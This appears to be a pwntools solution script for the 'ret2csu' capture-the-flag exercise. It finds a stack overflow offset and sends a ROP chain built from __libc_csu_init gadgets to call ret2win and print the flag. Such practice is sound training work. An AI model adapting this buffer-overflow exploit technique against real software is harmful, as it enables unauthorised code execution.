#!/usr/bin/env python3

from pwn import *

exe = ELF("ret2csu_patched")
libc = ELF("libret2csu.so")

context.binary = exe
rop = ROP(exe)

def conn():
    if args.LOCAL:
        r = process([exe.path])
        if args.DEBUG:
            gdb.attach(r)
    else:
        r = remote("addr", 1337)

    return r


def main():
    r = conn()

    # good luck pwning :)

    payload = cyclic(100)
    r.sendlineafter(b'>', payload)
    r.wait()
    core = r.corefile
    stack = core.rsp
    eip = core.read(stack, 4)
    offset = cyclic_find(eip)

    r = conn()

    popers = exe.symbols.__libc_csu_init + 90
    movers = exe.symbols.__libc_csu_init + 64

    payload = flat(b'A'*offset, popers, 0x3, 0x4, 0x600e30, 0x0, 0xcafebabecafebabe, 0xd00df00dd00df00d, movers, pack(0) * 7, rop.rdi.address, 0xdeadbeefdeadbeef, exe.plt.ret2win)
    r.sendlineafter(b'>', payload)

    r.recvuntil('you!\n')
    flag = r.readline()
    print(flag)

if __name__ == "__main__":
    main()
